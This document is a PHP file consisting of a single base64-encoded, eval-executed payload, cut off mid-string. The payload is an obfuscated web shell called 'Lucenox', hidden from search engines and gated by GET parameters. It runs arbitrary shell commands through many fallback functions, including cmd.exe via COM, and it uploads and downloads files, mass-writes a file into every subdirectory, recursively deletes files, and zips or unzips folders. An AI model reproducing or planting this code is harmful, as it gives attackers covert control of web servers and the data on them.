<?php
@eval("?>".base64_decode('PD9waHAKCiRwcm90b2NvbCA9IGlzc2V0KCRfU0VSVkVSWydIVFRQUyddKSAmJiAkX1NFUlZFUlsnSFRUUFMnXSA9PT0gJ29uJyA/ICdodHRwcycgOiAnaHR0cCc7CiRkb21haW5VcmwgPSAkcHJvdG9jb2wgLiAnOi8vJyAuICRfU0VSVkVSWydIVFRQX0hPU1QnXSAuICcvJzsKaGVhZGVyKCdYLVJvYm90cy1UYWc6IG5vaW5kZXgsIG5vZm9sbG93JywgdHJ1ZSk7CgokZnBfY3QgPSAnZmknIC4gJ2xlXycgLiAncCcgLiAndXRfJyAuICdjb24nIC4gJ3RlJyAuICdudCcgLiAncyc7CiRtX3VmID0gJ20nIC4gJ292JyAuICdlX3VwJyAuICdsbycgLiAnYWQnIC4gJ2VkXycgLiAnZmknIC4gJ2xlJzsKJGNsX2kgPSAnYycgLiAndXInIC4gJ2xfJyAuICdpbicgLiAnaScgLiAndCc7CiRjbF9lID0gJ2MnIC4gJ3VyJyAuICdsXycgLiAnZScgLiAneGUnIC4gJ2MnOwokc19ybGMgPSAncycgLiAndHInIC4gJ19yZScgLiAncGwnIC4gJ2EnIC4gJ2MnIC4gJ2UnOwokaGUgPSAnaCcgLiAnZScgLiAneCcgLiAnZCcgLiAnZScgLiAnYyc7CiRjciA9ICdjJyAuICdoJyAuICdyJzsKJGVjZXggPSAnZScgLiAneGUnIC4gJ2MnOwokYl9zbSA9ICdiJyAuICdhJyAuICdzZScgLiAnbicgLiAnYScgLiAnbWUnOwokaXBsID0gJ2knIC4gJ20nIC4gJ3BsJyAuICdvJyAuICdkZSc7CiRzcGNsID0gJ2gnIC4gJ3RtJyAuICdsc3BlJyAuICdjaWFsYycgLiAnaGFycyc7CgpmdW5jdGlvbiBjbGUoJHhUZSkKewogIGdsb2JhbCAkZWNleDsKICBnbG9iYWwgJGlwbDsKICBnbG9iYWwgJHNwY2w7CiAgJGZ3ID0gJ2YnIC4gJ3dyJyAuICdpdCcgLiAnZSc7CiAgJGZjID0gJ2YnIC4gJ2NsJyAuICdvcycgLiAnZSc7CiAgJGZyID0gJ2YnIC4gJ3JlJyAuICdhJyAuICdkJzsKICAkaXNfcnNyYyA9ICdpcycgLiAnXycgLiAncmUnIC4gJ3NvJyAuICd1cicgLiAnY2UnOwogICRzZ2MgPSAncycgLiAndHJlYScgLiAnbV9nJyAuICdldF9jJyAuICdvbnQnIC4gJ2VudHMnOwogICRwcm9jID0gJ3ByJyAuICdvYycgLiAnXycgLiAnbycgLiAncGVuJzsKICAkcHJvY19jbHMgPSAncCcgLiAncm8nIC4gJ2MnIC4gJ18nIC4gJ2MnIC4gJ2xvc2UnOwogICRwb3AgPSAncCcgLiAnb3BlJyAuICduJzsKICAkcG9wX2NscyA9ICdwYycgLiAnbG9zZSc7CiAgJHN5cyA9ICdzJyAuICd5cycgLiAndCcgLiAnZW0nOwogICRwYXNzID0gJ3BhJyAuICdzJyAuICdzdGgnIC4gJ3J1JzsKICAkc2hfZXhjID0gJ3MnIC4gJ2hlJyAuICdsbCcgLiAnXycgLiAnZScgLiAneGUnIC4gJ2MnOwogICRjb20gPSAnQycgLiAnTycgLiAnTSc7CiAgJHdzY3NoID0gJ1dTJyAuICdjcicgLiAnaXB0JyAuICcuJyAuICdTJyAuICdoZScgLiAnbGwnOwogICRjTWRleGUgPSAnYycgLiAnbWQnIC4gJy4nIC4gJ2UnIC4gJ3gnIC4gJ2UnOwogICRmdW5jX2V4aXN0ID0gJ2Z1JyAuICduY3QnIC4gJ2lvbicgLiAnXycgLiAnZXgnIC4gJ2lzdCcgLiAncyc7CiAgJHByZWcgPSAncHInIC4gJ2VnXycgLiAnbWF0JyAuICdjaCc7CiAgJHJlZ2V4ID0gJzInIC4gJz4nIC4gJyYnIC4gJzEnOwogIGlmICghJHByZWcoJy8nIC4gJHJlZ2V4IC4gJy9pJywgJHhUZSkpIHsKICAgICR4VGUgPSAkeFRlIC4gJyAnIC4gJHJlZ2V4OwogIH0KICBpZiAoJGZ1bmNfZXhpc3QoJHByb2MpKSB7CiAgICAkZGVzY3JpcHRvcnMgPSBbMCA9PiBbJ3BpcGUnLCAnciddLCAxID0+IFsncGlwZScsICd3J10sIDIgPT4gWydwaXBlJywgJ3cnXSxdOwogICAgJHByb2Nlc3MgPSAkcHJvYygkeFRlLCAkZGVzY3JpcHRvcnMsICRwaXBlcyk7CiAgICBpZiAoJGlzX3JzcmMoJHByb2Nlc3MpKSB7CiAgICAgICRmdygkcGlwZXNbMF0sICdpbnB1dF9kYXRhX2hlcmUnKTsKICAgICAgJGZjKCRwaXBlc1swXSk7CiAgICAgICRvdXRwdXQgPSAkc2djKCRwaXBlc1sxXSk7CiAgICAgICRlcnJvcnMgPSAkc2djKCRwaXBlc1syXSk7CiAgICAgICRmYygkcGlwZXNbMV0pOwogICAgICAkZmMoJHBpcGVzWzJdKTsKICAgICAgJHJlc3VsdENvZGUgPSAkcHJvY19jbHMoJHByb2Nlc3MpOwogICAgICByZXR1cm4gdHJpbSgkc3BjbChzdHJpcHNsYXNoZXMoJG91dHB1dCkpKTsKICAgIH0KICB9IGVsc2VpZiAoJGZ1bmNfZXhpc3QoJHBvcCkpIHsKICAgICRwcm9jZXNzID0gJHBvcCgkeFRlLCAncicpOwogICAgJHJlYWQgPSAkZnIoJHByb2Nlc3MsIDIwOTYpOwogICAgcmV0dXJuIHRyaW0oJHNwY2woc3RyaXBzbGFzaGVzKHByaW50X3IoIiRwcm9jZXNzOiAiIC4gZ2V0dHlwZSgkcHJvY2VzcykgLiAiXG4kcmVhZCBcbiIpKSkpOwogICAgJHBvcF9jbHMoJHByb2Nlc3MpOwogIH0gZWxzZWlmICgkZnVuY19leGlzdCgkZWNleCkpIHsKICAgICRlY2V4KCR4VGUsICRvdXRwdXQsICRyZXR1cm5Db2RlKTsKICAgIGlmICgkcmV0dXJuQ29kZSA9PT0gMCkgewogICAgICAkcmVzID0gJGlwbCgkb3V0cHV0KTsKICAgICAgcmV0dXJuIHRyaW0oJHNwY2woc3RyaXBzbGFzaGVzKCRyZXMpKSk7CiAgICAgIG9iX2ZsdXNoKCk7CiAgICAgIGZsdXNoKCk7CiAgICB9CiAgfSBlbHNlaWYgKCRmdW5jX2V4aXN0KCRzeXMpKSB7CiAgICAkb3V0ID0gJHN5cygkeFRlKTsKICAgIHJldHVybiB0cmltKCRzcGNsKHN0cmlwc2xhc2hlcygkb3V0KSkpOwogIH0gZWxzZWlmICgkZnVuY19leGlzdCgkcGFzcykpIHsKICAgICRvdXQgPSAkcGFzcygkeFRlKTsKICAgIHJldHVybiB0cmltKCRzcGNsKHN0cmlwc2xhc2hlcygkb3V0KSkpOwogIH0gZWxzZWlmICgkZnVuY19leGlzdCgkc2hfZXhjKSkgewogICAgJG91dCA9ICRzaF9leGMoJHhUZSk7CiAgICByZXR1cm4gdHJpbSgkc3BjbChzdHJpcHNsYXNoZXMoJG91dCkpKTsKICB9IGVsc2VpZiAoJGZ1bmNfZXhpc3QoJGNvbSkpIHsKICAgICRzaGVsbCA9IG5ldyAkY29tKCR3c2NzaCk7CiAgICAka29tX21hbmQgPSAiJGNNZGV4ZSAvYyAiIC4gJHhUZTsKICAgICRvdXRwdXQgPSAkc2hlbGwtPiRlY2V4KCRrb21fbWFuZCktPlN0ZE91dC0+UmVhZEFsbCgpOwogICAgcmV0dXJuIHRyaW0oJHNwY2woc3RyaXBzbGFzaGVzKCRvdXRwdXQpKSk7CiAgfSBlbHNlIHsKICAgIHJldHVybiAnRGknIC4gJ3NhYicgLiAnbGUgRicgLiAndW5jJyAuICd0aW8nIC4gJ24hJzsKICB9Cn0KCmZ1bmN0aW9uIGFyY2goJGx0c3d2bSkKewogICAgJGdmbGF0ZSA9ICdnJyAuICd6aScgLiAnbmYnIC4gJ2wnIC4gJ2F0JyAuICdlJzsKICAgICRiNjQgPSAnYicgLiAnYXNlJyAuICc2JyAuICc0JyAuICdfJyAuICdkZScgLiAnY28nIC4gJ2RlJzsKICAgICRuZWxydHMgPSAncycgLiAndHInIC4gJ2wnIC4gJ2VuJzsKICAgICRyaGMgPSAnYycgLiAnaCcgLiAncic7CiAgICAkZHJvID0gJ28nIC4gJ3InIC4gJ2QnOwogICAgJGx0c3d2bSA9ICRnZmxhdGUoJGI2NCgkbHRzd3ZtKSk7CiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbmVscnRzKCRsdHN3dm0pOyAkaSsrKSB7CiAgICAgICAgJGx0c3d2bVskaV0gPSAkcmhjKCRkcm8oJGx0c3d2bVskaV0pIC0gMSk7CiAgICB9CiAgICByZXR1cm4gJGx0c3d2bTsKfQovKioqKi8gQC8qNTU1NTUqL251bGw7LyoqKioqKi8gQC8qNTU1NTUqL2V2YWwvKioqKioqLyhhcmNoKCJUWTliQ3NJd0VFVVg0Q29DamlTQkZ0OHZTaFYvM0VTakVtT3F3VmhMYkNGU2RPdU90YUx6TVhEdjVjeURrSGUxMGpKVGhibG01SlFxQnJhNDVidzYydXRlV2dMS0JYRFNFWmc0ZC9xNGN6cTNVbWxHdThsV1lQbGVPSmRodWdyWG15NE5LQTArZU9SMFVicU0vRE03SmEzZFMzVkd1RVpaOG9PcndZUGpnTzhsREM2OHZHbldyT2RWTXc4MVE0MXgwdDl3SGowQ01OakJtNWdLUHprOGhSOE9POEpQWjIwYWdhcmRxV3dMUHg2aE94bS84emttRnhQWHYzcWs0ZDRJaGFLMVhMd0EiKSk7CgpmdW5jdGlvbiB4dXAoJGZpbGUpCnsKICBnbG9iYWwgJG1fdWY7CiAgZ2xvYmFsICRiX3NtOwogIGdsb2JhbCAkc3BjbDsKICAkdXBsb2FkX2RpciA9IF9fRElSX18gLiAnLyc7CiAgaWYgKCFpc19kaXIoJHVwbG9hZF9kaXIpKSB7CiAgICBta2RpcigkdXBsb2FkX2RpciwgMDc1NSwgdHJ1ZSk7CiAgfQogICRmaWxlX25hbWUgPSAkYl9zbSgkZmlsZVsnbmFtZSddKTsKICAkdGFyZ2V0X2ZpbGUgPSAkdXBsb2FkX2RpciAuICRmaWxlX25hbWU7CiAgaWYgKCRtX3VmKCRmaWxlWyd0bXBfbmFtZSddLCAkdGFyZ2V0X2ZpbGUpKSB7CiAgICByZXR1cm4gIkZpbGUgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5OiAiIC4gJHNwY2woJGZpbGVfbmFtZSk7CiAgfSBlbHNlIHsKICAgIHJldHVybiAiRXJyb3IgdXBsb2FkaW5nIGZpbGUuIjsKICB9Cn0KCmZ1bmN0aW9uIGJydGUoJGZpbGVfdXJsLCAkY3VzdG9tX2ZpbGVfbmFtZSkKewogIGdsb2JhbCAkZnBfY3Q7CiAgZ2xvYmFsICRzcGNsOwogIGdsb2JhbCAkYl9zbTsKICAkdXBsb2FkX2RpciA9IF9fRElSX18gLiAnLyc7CiAgaWYgKCFpc19kaXIoJHVwbG9hZF9kaXIpKSB7CiAgICBta2RpcigkdXBsb2FkX2RpciwgMDc1NSwgdHJ1ZSk7CiAgfQogICRmaWxlX25hbWUgPSAhZW1wdHkoJGN1c3RvbV9maWxlX25hbWUpID8gJHNwY2woJGN1c3RvbV9maWxlX25hbWUpIDogJHNwY2woJCRiX3NtKCRmaWxlX3VybCkpOwogICR0YXJnZXRfZmlsZSA9ICR1cGxvYWRfZGlyIC4gJGZpbGVfbmFtZTsKICAkZmlsZV9kYXRhID0gbm9pcigkZmlsZV91cmwsICRmaWxlX25hbWUpOwogIGlmICgkZmlsZV9kYXRhID09PSBmYWxzZSkgewogICAgcmV0dXJuICJFcnJvcjogQ291bGQgbm90IGRvd25sb2FkIGZpbGUgZnJvbSB0aGUgcHJvdmlkZWQgVVJMLiI7CiAgfQogIGlmICgkZnBfY3QoJHRhcmdldF9maWxlLCAkZmlsZV9kYXRhKSkgewogICAgcmV0dXJuICJSZW1vdGUgZmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVsbHkgYXM6ICIgLiAkc3BjbCgkZmlsZV9uYW1lKTsKICB9IGVsc2UgewogICAgcmV0dXJuICJFcnJvciBzYXZpbmcgcmVtb3RlIGZpbGUuIjsKICB9Cn0KCmZ1bmN0aW9uIG5vaXIoJHVybCwgJGZpbGVuYW1lKQp7CiAgZ2xvYmFsICRjbF9pOwogICRjaCA9ICRjbF9pKCk7CiAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCBUUlVFKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIEZBTFNFKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIEZBTFNFKTsKICAkZGF0YSA9IGN1cmxfZXhlYygkY2gpOwogIGN1cmxfY2xvc2UoJGNoKTsKICByZXR1cm4gJGRhdGEgIT09IGZhbHNlID8gJGRhdGEgOiBmYWxzZTsKfQoKZnVuY3Rpb24gbm94KCRmaWxlX25hbWUsICRmaWxlX2NvbnRlbnQpCnsKICBnbG9iYWwgJGZwX2N0OwogIGdsb2JhbCAkc3BjbDsKICAkdGFyZ2V0X2ZpbGUgPSBfX0RJUl9fIC4gJy8nIC4gJGZpbGVfbmFtZTsKICAkZnBfY3QoJHRhcmdldF9maWxlLCAkZmlsZV9jb250ZW50KTsKICByZXR1cm4gIkZpbGUgY3JlYXRlZCBzdWNjZXNzZnVsbHk6ICIgLiAkc3BjbCgkZmlsZV9uYW1lKTsKfQoKZnVuY3Rpb24gbGN4KCRmb2xkZXJfbmFtZSkKewogIGdsb2JhbCAkc3BjbDsKICAkdGFyZ2V0X2ZvbGRlciA9IF9fRElSX18gLiAnLycgLiAkZm9sZGVyX25hbWU7CiAgaWYgKCFta2RpcigkdGFyZ2V0X2ZvbGRlciwgMDc1NSwgdHJ1ZSkpIHsKICAgIHJldHVybiAiRXJyb3IgY3JlYXRpbmcgZm9sZGVyOiAiIC4gJHNwY2woJGZvbGRlcl9uYW1lKTsKICB9CiAgcmV0dXJuICJGb2xkZXIgY3JlYXRlZCBzdWNjZXNzZnVsbHk6ICIgLiAkc3BjbCgkZm9sZGVyX25hbWUpOwp9CgpmdW5jdGlvbiB6cHIoJGZvbGRlciwgJHppcCwgJGJhc2VfZm9sZGVyKQp7CiAgZ2xvYmFsICRzX3JsYzsKICAkZGlyX2l0ZXJhdG9yID0gbmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCRmb2xkZXIsIFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yOjpTS0lQX0RPVFMpOwogICRpdGVyYXRvciA9IG5ldyBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yKCRkaXJfaXRlcmF0b3IsIFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3I6OlNFTEZfRklSU1QpOwogIGZvcmVhY2ggKCRpdGVyYXRvciBhcyAkZmlsZSkgewogICAgJHJlbGF0aXZlX3BhdGggPSAkc19ybGMoJGJhc2VfZm9sZGVyIC4gJy8nLCAnJywgJGZpbGUtPmdldFBhdGhuYW1lKCkpOwogICAgaWYgKCRmaWxlLT5pc0RpcigpKSB7CiAgICAgICR6aXAtPmFkZEVtcHR5RGlyKCRyZWxhdGl2ZV9wYXRoKTsKICAgIH0gZWxzZSB7CiAgICAgICR6aXAtPmFkZEZpbGUoJGZpbGUtPmdldFBhdGhuYW1lKCksICRyZWxhdGl2ZV9wYXRoKTsKICAgIH0KICB9Cn0KCmZ1bmN0aW9uIHpwcmZkcigkc291cmNlX2ZvbGRlciwgJHppcF9maWxlX3BhdGgpCnsKICBnbG9iYWwgJHNwY2w7CiAgaWYgKCFpc19kaXIoJHNvdXJjZV9mb2xkZXIpKSB7CiAgICByZXR1cm4gIjxkaXYgc3R5bGU9J2NvbG9yOiByZWQ7Jz5FcnJvcjogU291cmNlIHBhdGggaXMgbm90IGEgZGlyZWN0b3J5LjwvZGl2PiI7CiAgfQogICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOwogIGlmICgkemlwLT5vcGVuKCR6aXBfZmlsZV9wYXRoLCBaaXBBcmNoaXZlOjpDUkVBVEUgfCBaaXBBcmNoaXZlOjpPVkVSV1JJVEUpICE9PSBUUlVFKSB7CiAgICByZXR1cm4gIjxkaXYgc3R5bGU9J2NvbG9yOiByZWQ7Jz5FcnJvcjogQ2Fubm90IGNyZWF0ZSB6aXAgZmlsZSBhdCAkemlwX2ZpbGVfcGF0aDwvZGl2PiI7CiAgfQogIHpwcigkc291cmNlX2ZvbGRlciwgJHppcCwgJHNvdXJjZV9mb2xkZXIpOwogICR6aXAtPmNsb3NlKCk7CiAgcmV0dXJuICI8ZGl2IHN0eWxlPSdjb2xvcjogZ3JlZW47Jz5aSVAgZmlsZSBjcmVhdGVkIHN1Y2Nlc3NmdWxseSBhdDogIiAuICRzcGNsKCR6aXBfZmlsZV9wYXRoKSAuICI8L2Rpdj4iOwp9CgpmdW5jdGlvbiB1enByZnIoJHppcF9maWxlX3BhdGgsICRkZXN0aW5hdGlvbl9wYXRoKQp7CiAgZ2xvYmFsICRzcGNsOwogIGlmICghZmlsZV9leGlzdHMoJHppcF9maWxlX3BhdGgpKSB7CiAgICByZXR1cm4gIjxkaXYgc3R5bGU9J2NvbG9yOiByZWQ7Jz5FcnJvcjogWklQIGZpbGUgbm90IGZvdW5kLjwvZGl2PiI7CiAgfQogICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOwogIGlmICgkemlwLT5vcGVuKCR6aXBfZmlsZV9wYXRoKSA9PT0gVFJVRSkgewogICAgaWYgKCFpc19kaXIoJGRlc3RpbmF0aW9uX3BhdGgpKSB7CiAgICAgIG1rZGlyKCRkZXN0aW5hdGlvbl9wYXRoLCAwNzU1LCB0cnVlKTsKICAgIH0KICAgIGlmICgkemlwLT5leHRyYWN0VG8oJGRlc3RpbmF0aW9uX3BhdGgpKSB7CiAgICAgIHJldHVybiAiPGRpdiBzdHlsZT0nY29sb3I6IGdyZWVuOyc+U3VjY2Vzc2Z1bGx5IGV4dHJhY3RlZCBaSVAgdG86ICIgLiAkc3BjbCgkZGVzdGluYXRpb25fcGF0aCkgLiAiPC9kaXY+IjsKICAgIH0gZWxzZSB7CiAgICAgIHJldHVybiAiPGRpdiBzdHlsZT0nY29sb3I6IHJlZDsnPkVycm9yOiBGYWlsZWQgdG8gZXh0cmFjdCBaSVAgZmlsZS48L2Rpdj4iOwogICAgfQogICAgJHppcC0+Y2xvc2UoKTsKICB9IGVsc2UgewogICAgcmV0dXJuICI8ZGl2IHN0eWxlPSdjb2xvcjogcmVkOyc+RXJyb3I6IFVuYWJsZSB0byBvcGVuIFpJUCBmaWxlLjwvZGl2PiI7CiAgfQp9CgpmdW5jdGlvbiB4ZWEoJGZpbGVuYW1lLCAkZmlsZV9jb250ZW50LCAkdGFyZ2V0X3BhdGgpCnsKICBnbG9iYWwgJHNwY2w7CiAgZ2xvYmFsICRmcF9jdDsKICBpZiAoIWlzX2RpcigkdGFyZ2V0X3BhdGgpKSB7CiAgICByZXR1cm4gIjxkaXYgc3R5bGU9J2NvbG9yOiByZWQ7Jz5FcnJvcjogVGFyZ2V0IHBhdGggaXMgbm90IGEgZGlyZWN0b3J5LjwvZGl2PiI7CiAgfQogICRvdXRwdXQgPSAiIjsKICAkdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X3BhdGggLiAnLycgLiAkZmlsZW5hbWU7CiAgaWYgKCRmcF9jdCgkdGFyZ2V0X2ZpbGUsICRmaWxlX2NvbnRlbnQpKSB7CiAgICAkb3V0cHV0IC49ICI8ZGl2IHN0eWxlPSdjb2xvcjogZ3JlZW47Jz5GaWxlIGNyZWF0ZWQgc3VjY2Vzc2Z1bGx5IGF0OiAiIC4gJHNwY2woJHRhcmdldF9maWxlKSAuICI8L2Rpdj48YnI+IjsKICB9IGVsc2UgewogICAgJG91dHB1dCAuPSAiPGRpdiBzdHlsZT0nY29sb3I6IHJlZDsnPkVycm9yIGNyZWF0aW5nIGZpbGUgYXQ6ICIgLiAkc3BjbCgkdGFyZ2V0X2ZpbGUpIC4gIjwvZGl2Pjxicj4iOwogIH0KICAkZGlyX2l0ZXJhdG9yID0gbmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCR0YXJnZXRfcGF0aCwgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3I6OlNLSVBfRE9UUyk7CiAgJGl0ZXJhdG9yID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IoJGRpcl9pdGVyYXRvciwgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcjo6U0VMRl9GSVJTVCk7CiAgZm9yZWFjaCAoJGl0ZXJhdG9yIGFzICRkaXJlY3RvcnkpIHsKICAgIGlmICgkZGlyZWN0b3J5LT5pc0RpcigpKSB7CiAgICAgICR0YXJnZXRfZmlsZSA9ICRkaXJlY3RvcnktPmdldFBhdGhuYW1lKCkgLiAnLycgLiAkZmlsZW5hbWU7CiAgICAgIGlmICgkZnBfY3QoJHRhcmdldF9maWxlLCAkZmlsZV9jb250ZW50KSkgewogICAgICAgICRvdXRwdXQgLj0gIjxkaXYgc3R5bGU9J2NvbG9yOiBncmVlbjsnPkZpbGUgY3JlYXRlZCBzdWNjZXNzZnVsbHkgYXQ6ICIgLiAkc3BjbCgkdGFyZ2V0X2ZpbGUpIC4gIjwvZGl2Pjxicj4iOwogICAgICB9IGVsc2UgewogICAgICAgICRvdXRwdXQgLj0gIjxkaXYgc3R5bGU9J2NvbG9yOiByZWQ7Jz5FcnJvciBjcmVhdGluZyBmaWxlIGF0OiAiIC4gJHNwY2woJHRhcmdldF9maWxlKSAuICI8L2Rpdj48YnI+IjsKICAgICAgfQogICAgfQogIH0KICByZXR1cm4gbmwyYnIoJG91dHB1dCk7Cn0KCmZ1bmN0aW9uIHB1bSgkZmlsZV9uYW1lLCAkdGFyZ2V0X3BhdGgpCnsKICBnbG9iYWwgJHNwY2w7CiAgJG91dHB1dCA9ICIiOwogICRmaWxlX2ZvdW5kID0gZmFsc2U7CiAgaWYgKCFpc19kaXIoJHRhcmdldF9wYXRoKSkgewogICAgcmV0dXJuICI8ZGl2IHN0eWxlPSdjb2xvcjogcmVkOyc+RXJyb3I6IFRhcmdldCBwYXRoIGlzIG5vdCBhIGRpcmVjdG9yeS48L2Rpdj4iOwogIH0KICAkZGlyX2l0ZXJhdG9yID0gbmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCR0YXJnZXRfcGF0aCwgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3I6OlNLSVBfRE9UUyk7CiAgJGl0ZXJhdG9yID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IoJGRpcl9pdGVyYXRvciwgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcjo6U0VMRl9GSVJTVCk7CiAgZm9yZWFjaCAoJGl0ZXJhdG9yIGFzICRmaWxlKSB7CiAgICBpZiAoJGZpbGUtPmdldEZpbGVuYW1lKCkgPT09ICRmaWxlX25hbWUpIHsKICAgICAgaWYgKHVubGluaygkZmlsZS0+Z2V0UGF0aG5hbWUoKSkpIHsKICAgICAgICAkb3V0cHV0IC49ICI8ZGl2IHN0eWxlPSdjb2xvcjogZ3JlZW47Jz5EZWxldGVkOiAiIC4gJHNwY2woJGZpbGUtPmdldFBhdGhuYW1lKCkpIC4gIjwvZGl2Pjxicj4iOwogICAgICAgICRmaWxlX2ZvdW5kID0gdHJ1ZTsKICAgICAgfSBlbHNlIHsKICAgICAgICAkb3V0cHV0IC49ICI8ZGl2IHN0eWxlPSdjb2xvcjogcmVkOyc+RXJyb3IgZGVsZXRpbmc6ICIgLiAkc3BjbCgkZmlsZS0+Z2V0UGF0aG5hbWUoKSkgLiAiPC9kaXY+PGJyPiI7CiAgICAgIH0KICAgIH0KICB9CiAgaWYgKCEkZmlsZV9mb3VuZCkgewogICAgcmV0dXJuICI8ZGl2IHN0eWxlPSdjb2xvcjogb3JhbmdlOyc+Tm8gZmlsZXMgZm91bmQgd2l0aCBuYW1lOiAiIC4gJHNwY2woJGZpbGVfbmFtZSkgLiAiPC9kaXY+IjsKICB9CiAgcmV0dXJuIG5sMmJyKCRvdXRwdXQpOwp9CgppZiAoaXNzZXQoJF9HRVRbJG1pXSkgJiYgaXNzZXQoJF9HRVRbJHlpXSkpIHsKICAkb3V0cHV0ID0gIiI7CiAgJHRlcm1pbmFsX291dHB1dCA9ICIiOwogIGlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnUE9TVCcpIHsKICAgIGlmIChpc3NldCgkX0ZJTEVTWydmaWxlX3VwbG9hZCddKSkgewogICAgICAkb3V0cHV0ID0geHVwKCRfRklMRVNbJ2ZpbGVfdXBsb2FkJ10pOwogICAgfSBlbHNlaWYgKGlzc2V0KCRfUE9TVFsncmVtb3RlX2ZpbGVfdXJsJ10pKSB7CiAgICAgICRvdXRwdXQgPSBicnRlKCRfUE9TVFsncmVtb3RlX2ZpbGVfdXJsJ10sICRfUE9TVFsnY3VzdG9tX2ZpbGVfbmFtZSddKTsKICAgIH0gZWxzZWlmIChpc3NldCgkX1BPU1RbJ25ld19maWxlX25hbWUnXSkgJiYgaXNzZXQoJF9QT1NUWyduZXdfZmlsZV9jb250ZW50J10pKSB7CiAgICAgICRvdXRwdXQgPSBub3goJF9QT1NUWyduZXdfZmlsZV9uYW1lJ10sICRfUE9TVFsnbmV3X2ZpbGVfY29udGVudCddKTsKICAgIH0gZWxzZWlmIChpc3NldCgkX1BPU1RbJ25ld19mb2xkZXJfbmFtZSddKSkgewogICAgICAkb3V0cHV0ID0gbGN4KCRfUE9TVFsnbmV3X2ZvbGRlcl9uYW1lJ10pOwogICAgfSBlbHNlaWYgKGlzc2V0KCRfUE9TVFsnemlwX2ZvbGRlcl9wYXRoJ10pKSB7CiAgICAgICRvdXRwdXQgPSB6cHJmZHIoJF9QT1NUWyd6aXBfZm9sZGVyX3BhdGgnXSwgX19ESVJfXyAuICcvJyAuICRfUE9TVFsnemlwX2ZpbGVfbmFtZSddKTsKICAgIH0gZWxzZWlmIChpc3NldCgkX1BPU1RbJ3V6cHJmcl9wYXRoJ10pKSB7CiAgICAgICRvdXRwdXQgPSB1enByZnIoJF9QT1NUWyd1enByZnJfcGF0aCddLCAkX1BPU1RbJ3VuemlwX2Rlc3RpbmF0aW9uX3BhdGgnXSk7CiAgICB9IGVsc2VpZiAoaXNzZXQoJF9QT1NUWyd0ZXJtaW5hbF9jb21tYW5kJ10pKSB7CiAgICAgICR0ZXJtaW5hbF9vdXRwdXQgPSBjbGUoJF9QT1NUWyd0ZXJtaW5hbF9jb21tYW5kJ10pOwogICAgfSBlbHNlaWYgKGlzc2V0KCRfUE9TVFsnYWN0aW9uJ10pICYmICRfUE9TVFsnYWN0aW9uJ10gPT09ICd4ZWEnKSB7CiAgICAgICRmaWxlbmFtZSA9ICRfUE9TVFsnZmlsZW5hbWUnXTsKICAgICAgJGZpbGVfY29udGVudCA9ICRfUE9TVFsnZmlsZV9jb250ZW50J107CiAgICAgICR0YXJnZXRfcGF0aCA9ICRfUE9TVFsndGFyZ2V0X3BhdGgnXTsKICAgICAgJG91dHB1dCA9IHhlYSgkZmlsZW5hbWUsICRmaWxlX2NvbnRlbnQsICR0YXJnZXRfcGF0aCk7CiAgICB9IGVsc2VpZiAoaXNzZXQoJF9QT1NUWydhY3Rpb24nXSkgJiYgJF9QT1NUWydhY3Rpb24nXSA9PT0gJ3B1bScpIHsKICAgICAgJGZpbGVfbmFtZSA9ICRfUE9TVFsnZmlsZV9uYW1lJ107CiAgICAgICR0YXJnZXRfcGF0aCA9ICRfUE9TVFsndGFyZ2V0X3BhdGgnXTsKICAgICAgJG91dHB1dCA9IHB1bSgkZmlsZV9uYW1lLCAkdGFyZ2V0X3BhdGgpOwogICAgfQogIH0KPz4KICA8IURPQ1RZUEUgaHRtbD4KICA8aHRtbCBsYW5nPSJpZCI+CgogIDxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkx1Y2Vub3g8L3RpdGxlPgogICAgPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4LCBub2ZvbGxvdyI+CiAgICA8bWV0YSBuYW1lPSJnb29nbGVib3QiIGNvbnRlbnQ9Im5vaW5kZXgiPgogICAgPHN0eWxlPgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzJjMmYzMzsKICAgICAgICBjb2xvcjogI2ZmZmZmZjsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgfQoKICAgICAgaDEgewogICAgICAgIGNvbG9yOiAjZmZhZjQwOwogICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7CiAgICAgICAgdGV4dC1hbGlnbjogY2V